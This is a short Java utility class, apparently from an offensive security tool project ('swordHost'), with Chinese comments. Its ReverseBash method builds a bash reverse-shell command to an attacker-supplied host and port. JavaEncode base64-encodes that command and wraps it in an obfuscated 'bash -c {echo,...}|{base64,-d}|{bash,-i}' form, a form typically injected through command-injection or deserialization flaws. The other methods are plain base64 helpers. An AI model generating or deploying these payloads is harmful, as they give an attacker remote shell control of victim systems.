package com.swordHostDemo.controller;

import java.io.UnsupportedEncodingException;
import java.util.Base64;

/**
 * @date: 2022/12/26 17:17
 * @description:
 */
public class base64Code {


    public static String ReverseBash(String Lhost, String Lport) {
        String str = "bash -i >& /dev/tcp/" + Lhost + "/" + Lport + " 0>&1";

        System.out.println("原始字符串：" + str);
        return str;
    }

    //编码+后加工
    public static String JavaEncode(String Lhost, String Lport) {

        String base64EecodeStr = null;
        try {
            base64EecodeStr = Base64.getEncoder().encodeToString(ReverseBash(Lhost, Lport).getBytes("utf-8"));
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
        base64EecodeStr = "bash -c {echo," + base64EecodeStr + "}|{base64,-d}|{bash,-i}";
        return base64EecodeStr;
    }

    //编码
    public static String base64Eecode(String str) {
        byte[] textByte = new byte[0];
        try {
            textByte = str.getBytes("UTF-8");
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
        final String encodedText = Base64.getEncoder().encodeToString(textByte);
        System.out.println(encodedText);
        return encodedText;
    }

    //解码
    public static String base64Decode(String str) {

        System.out.println("解码的字符串：" + str);
        String base64decodedByte = null;
        byte[] base64decodedBytes = Base64.getDecoder().decode(str);
        try {
            base64decodedByte = new String(base64decodedBytes, "utf-8");
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
        return base64decodedByte;
    }


}
